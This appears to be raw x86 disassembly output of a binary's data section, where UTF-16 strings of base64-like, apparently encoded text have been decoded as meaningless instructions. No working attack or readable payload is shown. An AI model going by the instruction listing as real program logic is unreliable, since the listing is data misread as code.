10004112:	00 65 00             	add    %ah,0x0(%ebp)
10004115:	45                   	inc    %ebp
10004116:	00 4a 00             	add    %cl,0x0(%edx)
10004119:	6e                   	outsb  %ds:(%esi),(%dx)
1000411a:	00 52 00             	add    %dl,0x0(%edx)
1000411d:	6d                   	insl   (%dx),%es:(%edi)
1000411e:	00 52 00             	add    %dl,0x0(%edx)
10004121:	53                   	push   %ebx
10004122:	00 56 00             	add    %dl,0x0(%esi)
10004125:	44                   	inc    %esp
10004126:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
1000412a:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
1000412e:	00 68 00             	add    %ch,0x0(%eax)
10004131:	43                   	inc    %ebx
10004132:	00 5a 00             	add    %bl,0x0(%edx)
10004135:	30 00                	xor    %al,(%eax)
10004137:	5a                   	pop    %edx
10004138:	00 6b 00             	add    %ch,0x0(%ebx)
1000413b:	55                   	push   %ebp
1000413c:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004140:	00 33                	add    %dh,(%ebx)
10004142:	00 5a 00             	add    %bl,0x0(%edx)
10004145:	57                   	push   %edi
10004146:	00 31                	add    %dh,(%ecx)
10004148:	00 4f 00             	add    %cl,0x0(%edi)
1000414b:	62 00                	bound  %eax,(%eax)
1000414d:	30 00                	xor    %al,(%eax)
1000414f:	39 00                	cmp    %eax,(%eax)
10004151:	34 00                	xor    $0x0,%al
10004153:	51                   	push   %ecx
10004154:	00 6d 00             	add    %ch,0x0(%ebp)
10004157:	64 00 47 00          	add    %al,%fs:0x0(%edi)
1000415b:	5a                   	pop    %edx
1000415c:	00 46 00             	add    %al,0x0(%esi)
1000415f:	4a                   	dec    %edx
10004160:	00 55 00             	add    %dl,0x0(%ebp)
10004163:	4e                   	dec    %esi
10004164:	00 32                	add    %dh,(%edx)
10004166:	00 55 00             	add    %dl,0x0(%ebp)
10004169:	3d 00 00 15 4f       	cmp    $0x4f150000,%eax
1000416e:	00 78 00             	add    %bh,0x0(%eax)
10004171:	42                   	inc    %edx
10004172:	00 67 00             	add    %ah,0x0(%edi)
10004175:	46                   	inc    %esi
10004176:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
1000417a:	00 54 00 37          	add    %dl,0x37(%eax,%eax,1)
1000417e:	00 65 00             	add    %ah,0x0(%ebp)
10004181:	00 79 54             	add    %bh,0x54(%ecx)
10004184:	00 55 00             	add    %dl,0x0(%ebp)
10004187:	5a                   	pop    %edx
10004188:	00 76 00             	add    %dh,0x0(%esi)
1000418b:	64 00 54 00 52       	add    %dl,%fs:0x52(%eax,%eax,1)
10004190:	00 36                	add    %dh,(%esi)
10004192:	00 57 00             	add    %dl,0x0(%edi)
10004195:	48                   	dec    %eax
10004196:	00 59 00             	add    %bl,0x0(%ecx)
10004199:	31 00                	xor    %eax,(%eax)
1000419b:	55                   	push   %ebp
1000419c:	00 31                	add    %dh,(%ecx)
1000419e:	00 6b 00             	add    %ch,0x0(%ebx)
100041a1:	7a 00                	jp     0x100041a3
100041a3:	54                   	push   %esp
100041a4:	00 6b 00             	add    %ch,0x0(%ebx)
100041a7:	31 00                	xor    %eax,(%eax)
100041a9:	47                   	inc    %edi
100041aa:	00 62 00             	add    %ah,0x0(%edx)
100041ad:	33 00                	xor    (%eax),%eax
100041af:	55                   	push   %ebp
100041b0:	00 30                	add    %dh,(%eax)
100041b2:	00 65 00             	add    %ah,0x0(%ebp)
100041b5:	6c                   	insb   (%dx),%es:(%edi)
100041b6:	00 68 00             	add    %ch,0x0(%eax)
100041b9:	32 00                	xor    (%eax),%al
100041bb:	4e                   	dec    %esi
100041bc:	00 56 00             	add    %dl,0x0(%esi)
100041bf:	4e                   	dec    %esi
100041c0:	00 4e 00             	add    %cl,0x0(%esi)
100041c3:	52                   	push   %edx
100041c4:	00 6d 00             	add    %ch,0x0(%ebp)
100041c7:	39 00                	cmp    %eax,(%eax)
100041c9:	31 00                	xor    %eax,(%eax)
100041cb:	4e                   	dec    %esi
100041cc:	00 48 00             	add    %cl,0x0(%eax)
100041cf:	70 00                	jo     0x100041d1
100041d1:	59                   	pop    %ecx
100041d2:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
100041d6:	00 56 00             	add    %dl,0x0(%esi)
100041d9:	54                   	push   %esp
100041da:	00 61 00             	add    %ah,0x0(%ecx)
100041dd:	6b 00 31             	imul   $0x31,(%eax),%eax
100041e0:	00 47 00             	add    %al,0x0(%edi)
100041e3:	62 00                	bound  %eax,(%eax)
100041e5:	33 00                	xor    (%eax),%eax
100041e7:	55                   	push   %ebp
100041e8:	00 30                	add    %dh,(%eax)
100041ea:	00 65 00             	add    %ah,0x0(%ebp)
100041ed:	6c                   	insb   (%dx),%es:(%edi)
100041ee:	00 68 00             	add    %ch,0x0(%eax)
100041f1:	32 00                	xor    (%eax),%al
100041f3:	4e                   	dec    %esi
100041f4:	00 56 00             	add    %dl,0x0(%esi)
100041f7:	4d                   	dec    %ebp
100041f8:	00 3d 00 00 15 4d    	add    %bh,0x4d150000
100041fe:	00 46 00             	add    %al,0x0(%esi)
10004201:	6f                   	outsl  %ds:(%esi),(%dx)
10004202:	00 75 00             	add    %dh,0x0(%ebp)
10004205:	34 00                	xor    $0x0,%al
10004207:	7a 00                	jp     0x10004209
10004209:	58                   	pop    %eax
1000420a:	00 76 00             	add    %dh,0x0(%esi)
1000420d:	35 00 53 00 00       	xor    $0x5300,%eax
10004212:	81 71 63 00 56 00 70 	xorl   $0x70005600,0x63(%ecx)
10004219:	00 47 00             	add    %al,0x0(%edi)
1000421c:	64 00 30             	add    %dh,%fs:(%eax)
1000421f:	00 70 00             	add    %dh,0x0(%eax)
10004222:	34 00                	xor    $0x0,%al
10004224:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10004228:	4a                   	dec    %edx
10004229:	00 55 00             	add    %dl,0x0(%ebp)
1000422c:	57                   	push   %edi
1000422d:	00 56 00             	add    %dl,0x0(%esi)
10004230:	4e                   	dec    %esi
10004231:	00 58 00             	add    %bl,0x0(%eax)
10004234:	4e                   	dec    %esi
10004235:	00 58 00             	add    %bl,0x0(%eax)
10004238:	46                   	inc    %esi
10004239:	00 61 00             	add    %ah,0x0(%ecx)
1000423c:	52                   	push   %edx
1000423d:	00 6e 00             	add    %ch,0x0(%esi)
10004240:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
10004244:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
10004248:	70 00                	jo     0x1000424a
1000424a:	79 00                	jns    0x1000424c
1000424c:	56                   	push   %esi
1000424d:	00 46 00             	add    %al,0x0(%esi)
10004250:	6c                   	insb   (%dx),%es:(%edi)
10004251:	00 78 00             	add    %bh,0x0(%eax)
10004254:	57                   	push   %edi
10004255:	00 6b 00             	add    %ch,0x0(%ebx)
10004258:	5a                   	pop    %edx
10004259:	00 33                	add    %dh,(%ebx)
1000425b:	00 53 00             	add    %dl,0x0(%ebx)
1000425e:	6e                   	outsb  %ds:(%esi),(%dx)
1000425f:	00 68 00             	add    %ch,0x0(%eax)
10004262:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
10004266:	6c                   	insb   (%dx),%es:(%edi)
10004267:	00 52 00             	add    %dl,0x0(%edx)
1000426a:	5a                   	pop    %edx
1000426b:	00 65 00             	add    %ah,0x0(%ebp)
1000426e:	6d                   	insl   (%dx),%es:(%edi)
1000426f:	00 52 00             	add    %dl,0x0(%edx)
10004272:	48                   	dec    %eax
10004273:	00 63 00             	add    %ah,0x0(%ebx)
10004276:	56                   	push   %esi
10004277:	00 70 00             	add    %dh,0x0(%eax)
1000427a:	47                   	inc    %edi
1000427b:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
1000427f:	00 70 00             	add    %dh,0x0(%eax)
10004282:	34 00                	xor    $0x0,%al
10004284:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10004288:	4a                   	dec    %edx
10004289:	00 55 00             	add    %dl,0x0(%ebp)
1000428c:	57                   	push   %edi
1000428d:	00 58 00             	add    %bl,0x0(%eax)
10004290:	46                   	inc    %esi
10004291:	00 61 00             	add    %ah,0x0(%ecx)
10004294:	52                   	push   %edx
10004295:	00 6e 00             	add    %ch,0x0(%esi)
10004298:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
1000429c:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
100042a0:	70 00                	jo     0x100042a2
100042a2:	79 00                	jns    0x100042a4
100042a4:	56                   	push   %esi
100042a5:	00 46 00             	add    %al,0x0(%esi)
100042a8:	6c                   	insb   (%dx),%es:(%edi)
100042a9:	00 47 00             	add    %al,0x0(%edi)
100042ac:	63 00                	arpl   %eax,(%eax)
100042ae:	32 00                	xor    (%eax),%al
100042b0:	4a                   	dec    %edx
100042b1:	00 78 00             	add    %bh,0x0(%eax)
100042b4:	57                   	push   %edi
100042b5:	00 6b 00             	add    %ch,0x0(%ebx)
100042b8:	5a                   	pop    %edx
100042b9:	00 33                	add    %dh,(%ebx)
100042bb:	00 53 00             	add    %dl,0x0(%ebx)
100042be:	6e                   	outsb  %ds:(%esi),(%dx)
100042bf:	00 68 00             	add    %ch,0x0(%eax)
100042c2:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
100042c6:	6c                   	insb   (%dx),%es:(%edi)
100042c7:	00 52 00             	add    %dl,0x0(%edx)
100042ca:	5a                   	pop    %edx
100042cb:	00 63 00             	add    %ah,0x0(%ebx)
100042ce:	56                   	push   %esi
100042cf:	00 70 00             	add    %dh,0x0(%eax)
100042d2:	47                   	inc    %edi
100042d3:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
100042d7:	00 70 00             	add    %dh,0x0(%eax)
100042da:	34 00                	xor    $0x0,%al
100042dc:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
100042e0:	4a                   	dec    %edx
100042e1:	00 55 00             	add    %dl,0x0(%ebp)
100042e4:	57                   	push   %edi
100042e5:	00 55 00             	add    %dl,0x0(%ebp)
100042e8:	5a                   	pop    %edx
100042e9:	00 57 00             	add    %dl,0x0(%edi)
100042ec:	4d                   	dec    %ebp
100042ed:	00 48 00             	add    %cl,0x0(%eax)
100042f0:	46                   	inc    %esi
100042f1:	00 61 00             	add    %ah,0x0(%ecx)
100042f4:	52                   	push   %edx
100042f5:	00 6e 00             	add    %ch,0x0(%esi)
100042f8:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
100042fc:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
10004300:	70 00                	jo     0x10004302
10004302:	79 00                	jns    0x10004304
10004304:	56                   	push   %esi
10004305:	00 46 00             	add    %al,0x0(%esi)
10004308:	6c                   	insb   (%dx),%es:(%edi)
10004309:	00 78 00             	add    %bh,0x0(%eax)
1000430c:	57                   	push   %edi
1000430d:	00 6b 00             	add    %ch,0x0(%ebx)
10004310:	5a                   	pop    %edx
10004311:	00 33                	add    %dh,(%ebx)
10004313:	00 53 00             	add    %dl,0x0(%ebx)
10004316:	6e                   	outsb  %ds:(%esi),(%dx)
10004317:	00 68 00             	add    %ch,0x0(%eax)
1000431a:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
1000431e:	6c                   	insb   (%dx),%es:(%edi)
1000431f:	00 52 00             	add    %dl,0x0(%edx)
10004322:	5a                   	pop    %edx
10004323:	00 59 00             	add    %bl,0x0(%ecx)
10004326:	56                   	push   %esi
10004327:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
1000432b:	00 63 00             	add    %ah,0x0(%ebx)
1000432e:	56                   	push   %esi
1000432f:	00 70 00             	add    %dh,0x0(%eax)
10004332:	47                   	inc    %edi
10004333:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
10004337:	00 70 00             	add    %dh,0x0(%eax)
1000433a:	34 00                	xor    $0x0,%al
1000433c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10004340:	4a                   	dec    %edx
10004341:	00 55 00             	add    %dl,0x0(%ebp)
10004344:	57                   	push   %edi
10004345:	00 58 00             	add    %bl,0x0(%eax)
10004348:	46                   	inc    %esi
10004349:	00 61 00             	add    %ah,0x0(%ecx)
1000434c:	52                   	push   %edx
1000434d:	00 6e 00             	add    %ch,0x0(%esi)
10004350:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
10004354:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
10004358:	70 00                	jo     0x1000435a
1000435a:	79 00                	jns    0x1000435c
1000435c:	56                   	push   %esi
1000435d:	00 46 00             	add    %al,0x0(%esi)
10004360:	6b 00 39             	imul   $0x39,(%eax),%eax
10004363:	00 63 00             	add    %ah,0x0(%ebx)
10004366:	56                   	push   %esi
10004367:	00 70 00             	add    %dh,0x0(%eax)
1000436a:	47                   	inc    %edi
1000436b:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
1000436f:	00 70 00             	add    %dh,0x0(%eax)
10004372:	34 00                	xor    $0x0,%al
10004374:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
10004378:	4a                   	dec    %edx
10004379:	00 55 00             	add    %dl,0x0(%ebp)
1000437c:	57                   	push   %edi
1000437d:	00 51 00             	add    %dl,0x0(%ecx)
10004380:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004385:	15 71 00 5a 00       	adc    $0x5a0071,%eax
1000438a:	46                   	inc    %esi
1000438b:	00 77 00             	add    %dh,0x0(%edi)
1000438e:	4a                   	dec    %edx
1000438f:	00 78 00             	add    %bh,0x0(%eax)
10004392:	7a 00                	jp     0x10004394
10004394:	72 00                	jb     0x10004396
10004396:	54                   	push   %esp
10004397:	00 59 00             	add    %bl,0x0(%ecx)
1000439a:	00 80 f9 4d 00 47    	add    %al,0x47004df9(%eax)
100043a0:	00 46 00             	add    %al,0x0(%esi)
100043a3:	55                   	push   %ebp
100043a4:	00 4d 00             	add    %cl,0x0(%ebp)
100043a7:	30 00                	xor    %al,(%eax)
100043a9:	78 00                	js     0x100043ab
100043ab:	4b                   	dec    %ebx
100043ac:	00 55 00             	add    %dl,0x0(%ebp)
100043af:	46                   	inc    %esi
100043b0:	00 68 00             	add    %ch,0x0(%eax)
100043b3:	31 00                	xor    %eax,(%eax)
100043b5:	61                   	popa
100043b6:	00 32                	add    %dh,(%edx)
100043b8:	00 4a 00             	add    %cl,0x0(%edx)
100043bb:	74 00                	je     0x100043bd
100043bd:	5a                   	pop    %edx
100043be:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
100043c2:	00 68 00             	add    %ch,0x0(%eax)
100043c5:	56                   	push   %esi
100043c6:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
100043ca:	00 4d 00             	add    %cl,0x0(%ebp)
100043cd:	53                   	push   %ebx
100043ce:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
100043d2:	00 59 00             	add    %bl,0x0(%ecx)
100043d5:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
100043d9:	73 00                	jae    0x100043db
100043db:	77 00                	ja     0x100043dd
100043dd:	59                   	pop    %ecx
100043de:	00 56 00             	add    %dl,0x0(%esi)
100043e1:	51                   	push   %ecx
100043e2:	00 7a 00             	add    %bh,0x0(%edx)
100043e5:	54                   	push   %esp
100043e6:	00 45 00             	add    %al,0x0(%ebp)
100043e9:	70 00                	jo     0x100043eb
100043eb:	51                   	push   %ecx
100043ec:	00 57 00             	add    %dl,0x0(%edi)
100043ef:	48                   	dec    %eax
100043f0:	00 56 00             	add    %dl,0x0(%esi)
100043f3:	72 00                	jb     0x100043f5
100043f5:	62 00                	bound  %eax,(%eax)
100043f7:	47                   	inc    %edi
100043f8:	00 4a 00             	add    %cl,0x0(%edx)
100043fb:	75 00                	jne    0x100043fd
100043fd:	4d                   	dec    %ebp
100043fe:	00 47 00             	add    %al,0x0(%edi)
10004401:	46                   	inc    %esi
10004402:	00 55 00             	add    %dl,0x0(%ebp)
10004405:	4d                   	dec    %ebp
10004406:	00 30                	add    %dh,(%eax)
10004408:	00 78 00             	add    %bh,0x0(%eax)
1000440b:	4b                   	dec    %ebx
1000440c:	00 55 00             	add    %dl,0x0(%ebp)
1000440f:	46                   	inc    %esi
10004410:	00 68 00             	add    %ch,0x0(%eax)
10004413:	31 00                	xor    %eax,(%eax)
10004415:	61                   	popa
10004416:	00 7a 00             	add    %bh,0x0(%edx)
10004419:	42                   	inc    %edx
1000441a:	00 68 00             	add    %ch,0x0(%eax)
1000441d:	56                   	push   %esi
1000441e:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
10004422:	00 4d 00             	add    %cl,0x0(%ebp)
10004425:	53                   	push   %ebx
10004426:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
1000442a:	00 59 00             	add    %bl,0x0(%ecx)
1000442d:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10004431:	74 00                	je     0x10004433
10004433:	53                   	push   %ebx
10004434:	00 61 00             	add    %ah,0x0(%ecx)
10004437:	47                   	inc    %edi
10004438:	00 4d 00             	add    %cl,0x0(%ebp)
1000443b:	77 00                	ja     0x1000443d
1000443d:	59                   	pop    %ecx
1000443e:	00 56 00             	add    %dl,0x0(%esi)
10004441:	51                   	push   %ecx
10004442:	00 7a 00             	add    %bh,0x0(%edx)
10004445:	54                   	push   %esp
10004446:	00 45 00             	add    %al,0x0(%ebp)
10004449:	70 00                	jo     0x1000444b
1000444b:	51                   	push   %ecx
1000444c:	00 57 00             	add    %dl,0x0(%edi)
1000444f:	48                   	dec    %eax
10004450:	00 56 00             	add    %dl,0x0(%esi)
10004453:	72 00                	jb     0x10004455
10004455:	4d                   	dec    %ebp
10004456:	00 47 00             	add    %al,0x0(%edi)
10004459:	46                   	inc    %esi
1000445a:	00 55 00             	add    %dl,0x0(%ebp)
1000445d:	4d                   	dec    %ebp
1000445e:	00 30                	add    %dh,(%eax)
10004460:	00 78 00             	add    %bh,0x0(%eax)
10004463:	4b                   	dec    %ebx
10004464:	00 55 00             	add    %dl,0x0(%ebp)
10004467:	46                   	inc    %esi
10004468:	00 68 00             	add    %ch,0x0(%eax)
1000446b:	31 00                	xor    %eax,(%eax)
1000446d:	61                   	popa
1000446e:	00 7a 00             	add    %bh,0x0(%edx)
10004471:	4a                   	dec    %edx
10004472:	00 7a 00             	add    %bh,0x0(%edx)
10004475:	50                   	push   %eax
10004476:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
1000447a:	00 68 00             	add    %ch,0x0(%eax)
1000447d:	56                   	push   %esi
1000447e:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
10004482:	00 4d 00             	add    %cl,0x0(%ebp)
10004485:	53                   	push   %ebx
10004486:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
1000448a:	00 59 00             	add    %bl,0x0(%ecx)
1000448d:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10004491:	73 00                	jae    0x10004493
10004493:	3d 00 00 15 30       	cmp    $0x30150000,%eax
10004498:	00 61 00             	add    %ah,0x0(%ecx)
1000449b:	54                   	push   %esp
1000449c:	00 33                	add    %dh,(%ebx)
1000449e:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
100044a2:	00 50 00             	add    %dl,0x0(%eax)
100044a5:	58                   	pop    %eax
100044a6:	00 75 00             	add    %dh,0x0(%ebp)
100044a9:	6b 00 00             	imul   $0x0,(%eax),%eax
100044ac:	85 81 4d 00 33 00    	test   %eax,0x33004d(%ecx)
100044b2:	6b 00 79             	imul   $0x79,(%eax),%eax
100044b5:	00 55 00             	add    %dl,0x0(%ebp)
100044b8:	45                   	inc    %ebp
100044b9:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
100044bd:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
100044c1:	00 4e 00             	add    %cl,0x0(%esi)
100044c4:	6e                   	outsb  %ds:(%esi),(%dx)
100044c5:	00 5a 00             	add    %bl,0x0(%edx)
100044c8:	6c                   	insb   (%dx),%es:(%edi)
100044c9:	00 46 00             	add    %al,0x0(%esi)
100044cc:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
100044d0:	44                   	inc    %esp
100044d1:	00 4e 00             	add    %cl,0x0(%esi)
100044d4:	35 00 4d 00 6c       	xor    $0x6c004d00,%eax
100044d9:	00 42 00             	add    %al,0x0(%edx)
100044dc:	4c                   	dec    %esp
100044dd:	00 57 00             	add    %dl,0x0(%edi)
100044e0:	48                   	dec    %eax
100044e1:	00 56 00             	add    %dl,0x0(%esi)
100044e4:	6a 00                	push   $0x0
100044e6:	5a                   	pop    %edx
100044e7:	00 32                	add    %dh,(%edx)
100044e9:	00 59 00             	add    %bl,0x0(%ecx)
100044ec:	7a 00                	jp     0x100044ee
100044ee:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
100044f3:	00 51 00             	add    %dl,0x0(%ecx)
100044f6:	53                   	push   %ebx
100044f7:	00 31                	add    %dh,(%ecx)
100044f9:	00 68 00             	add    %ch,0x0(%eax)
100044fc:	31 00                	xor    %eax,(%eax)
100044fe:	59                   	pop    %ecx
100044ff:	00 32                	add    %dh,(%edx)
10004501:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004505:	00 59 00             	add    %bl,0x0(%ecx)
10004508:	31 00                	xor    %eax,(%eax)
1000450a:	68 00 47 00 4d       	push   $0x4d004700
1000450f:	00 33                	add    %dh,(%ebx)
10004511:	00 6b 00             	add    %ch,0x0(%ebx)
10004514:	79 00                	jns    0x10004516
10004516:	55                   	push   %ebp
10004517:	00 45 00             	add    %al,0x0(%ebp)
1000451a:	74 00                	je     0x1000451c
1000451c:	59                   	pop    %ecx
1000451d:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10004521:	00 4e 00             	add    %cl,0x0(%esi)
10004524:	6e                   	outsb  %ds:(%esi),(%dx)
10004525:	00 5a 00             	add    %bl,0x0(%edx)
10004528:	6a 00                	push   $0x0
1000452a:	4e                   	dec    %esi
1000452b:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
10004531:	00 42 00             	add    %al,0x0(%edx)
10004534:	4c                   	dec    %esp
10004535:	00 57 00             	add    %dl,0x0(%edi)
10004538:	48                   	dec    %eax
10004539:	00 56 00             	add    %dl,0x0(%esi)
1000453c:	6a 00                	push   $0x0
1000453e:	5a                   	pop    %edx
1000453f:	00 32                	add    %dh,(%edx)
10004541:	00 5a 00             	add    %bl,0x0(%edx)
10004544:	6b 00 63             	imul   $0x63,(%eax),%eax
10004547:	00 47 00             	add    %al,0x0(%edi)
1000454a:	49                   	dec    %ecx
1000454b:	00 7a 00             	add    %bh,0x0(%edx)
1000454e:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
10004553:	00 51 00             	add    %dl,0x0(%ecx)
10004556:	53                   	push   %ebx
10004557:	00 31                	add    %dh,(%ecx)
10004559:	00 68 00             	add    %ch,0x0(%eax)
1000455c:	31 00                	xor    %eax,(%eax)
1000455e:	59                   	pop    %ecx
1000455f:	00 32                	add    %dh,(%edx)
10004561:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004565:	00 4d 00             	add    %cl,0x0(%ebp)
10004568:	33 00                	xor    (%eax),%eax
1000456a:	6b 00 79             	imul   $0x79,(%eax),%eax
1000456d:	00 55 00             	add    %dl,0x0(%ebp)
10004570:	45                   	inc    %ebp
10004571:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
10004575:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10004579:	00 4e 00             	add    %cl,0x0(%esi)
1000457c:	6e                   	outsb  %ds:(%esi),(%dx)
1000457d:	00 5a 00             	add    %bl,0x0(%edx)
10004580:	6d                   	insl   (%dx),%es:(%edi)
10004581:	00 31                	add    %dh,(%ecx)
10004583:	00 53 00             	add    %dl,0x0(%ebx)
10004586:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
1000458a:	4e                   	dec    %esi
1000458b:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
10004591:	00 42 00             	add    %al,0x0(%edx)
10004594:	4c                   	dec    %esp
10004595:	00 57 00             	add    %dl,0x0(%edi)
10004598:	48                   	dec    %eax
10004599:	00 56 00             	add    %dl,0x0(%esi)
1000459c:	6a 00                	push   $0x0
1000459e:	5a                   	pop    %edx
1000459f:	00 32                	add    %dh,(%edx)
100045a1:	00 59 00             	add    %bl,0x0(%ecx)
100045a4:	7a 00                	jp     0x100045a6
100045a6:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
100045ab:	00 51 00             	add    %dl,0x0(%ecx)
100045ae:	53                   	push   %ebx
100045af:	00 31                	add    %dh,(%ecx)
100045b1:	00 68 00             	add    %ch,0x0(%eax)
100045b4:	31 00                	xor    %eax,(%eax)
100045b6:	59                   	pop    %ecx
100045b7:	00 32                	add    %dh,(%edx)
100045b9:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
100045bd:	00 5a 00             	add    %bl,0x0(%edx)
100045c0:	44                   	inc    %esp
100045c1:	00 4e 00             	add    %cl,0x0(%esi)
100045c4:	4f                   	dec    %edi
100045c5:	00 4d 00             	add    %cl,0x0(%ebp)
100045c8:	33 00                	xor    (%eax),%eax
100045ca:	6b 00 79             	imul   $0x79,(%eax),%eax
100045cd:	00 55 00             	add    %dl,0x0(%ebp)
100045d0:	45                   	inc    %ebp
100045d1:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
100045d5:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
100045d9:	00 4e 00             	add    %cl,0x0(%esi)
100045dc:	6e                   	outsb  %ds:(%esi),(%dx)
100045dd:	00 5a 00             	add    %bl,0x0(%edx)
100045e0:	6a 00                	push   $0x0
100045e2:	4e                   	dec    %esi
100045e3:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
100045e9:	00 42 00             	add    %al,0x0(%edx)
100045ec:	4c                   	dec    %esp
100045ed:	00 57 00             	add    %dl,0x0(%edi)
100045f0:	48                   	dec    %eax
100045f1:	00 56 00             	add    %dl,0x0(%esi)
100045f4:	6a 00                	push   $0x0
100045f6:	5a                   	pop    %edx
100045f7:	00 32                	add    %dh,(%edx)
100045f9:	00 5a 00             	add    %bl,0x0(%edx)
100045fc:	6a 00                	push   $0x0
100045fe:	57                   	push   %edi
100045ff:	00 45 00             	add    %al,0x0(%ebp)
10004602:	55                   	push   %ebp
10004603:	00 7a 00             	add    %bh,0x0(%edx)
10004606:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
1000460b:	00 51 00             	add    %dl,0x0(%ecx)
1000460e:	53                   	push   %ebx
1000460f:	00 31                	add    %dh,(%ecx)
10004611:	00 68 00             	add    %ch,0x0(%eax)
10004614:	31 00                	xor    %eax,(%eax)
10004616:	59                   	pop    %ecx
10004617:	00 32                	add    %dh,(%edx)
10004619:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
1000461d:	00 4d 00             	add    %cl,0x0(%ebp)
10004620:	33 00                	xor    (%eax),%eax
10004622:	6b 00 79             	imul   $0x79,(%eax),%eax
10004625:	00 55 00             	add    %dl,0x0(%ebp)
10004628:	45                   	inc    %ebp
10004629:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
1000462d:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10004631:	00 4e 00             	add    %cl,0x0(%esi)
10004634:	6e                   	outsb  %ds:(%esi),(%dx)
10004635:	00 5a 00             	add    %bl,0x0(%edx)
10004638:	6a 00                	push   $0x0
1000463a:	46                   	inc    %esi
1000463b:	00 77 00             	add    %dh,0x0(%edi)
1000463e:	57                   	push   %edi
1000463f:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
10004643:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
10004649:	00 42 00             	add    %al,0x0(%edx)
1000464c:	4c                   	dec    %esp
1000464d:	00 57 00             	add    %dl,0x0(%edi)
10004650:	48                   	dec    %eax
10004651:	00 56 00             	add    %dl,0x0(%esi)
10004654:	6a 00                	push   $0x0
10004656:	5a                   	pop    %edx
10004657:	00 32                	add    %dh,(%edx)
10004659:	00 59 00             	add    %bl,0x0(%ecx)
1000465c:	7a 00                	jp     0x1000465e
1000465e:	65 00 54 00 4a       	add    %dl,%gs:0x4a(%eax,%eax,1)
10004663:	00 51 00             	add    %dl,0x0(%ecx)
10004666:	53                   	push   %ebx
10004667:	00 31                	add    %dh,(%ecx)
10004669:	00 68 00             	add    %ch,0x0(%eax)
1000466c:	31 00                	xor    %eax,(%eax)
1000466e:	59                   	pop    %ecx
1000466f:	00 32                	add    %dh,(%edx)
10004671:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004675:	00 4d 00             	add    %cl,0x0(%ebp)
10004678:	30 00                	xor    %al,(%eax)
1000467a:	70 00                	jo     0x1000467c
1000467c:	32 00                	xor    (%eax),%al
1000467e:	4d                   	dec    %ebp
1000467f:	00 33                	add    %dh,(%ebx)
10004681:	00 6b 00             	add    %ch,0x0(%ebx)
10004684:	79 00                	jns    0x10004686
10004686:	55                   	push   %ebp
10004687:	00 45 00             	add    %al,0x0(%ebp)
1000468a:	74 00                	je     0x1000468c
1000468c:	59                   	pop    %ecx
1000468d:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10004691:	00 4e 00             	add    %cl,0x0(%esi)
10004694:	6e                   	outsb  %ds:(%esi),(%dx)
10004695:	00 5a 00             	add    %bl,0x0(%edx)
10004698:	6a 00                	push   $0x0
1000469a:	4e                   	dec    %esi
1000469b:	00 35 00 4d 00 6c    	add    %dh,0x6c004d00
100046a1:	00 42 00             	add    %al,0x0(%edx)
100046a4:	4c                   	dec    %esp
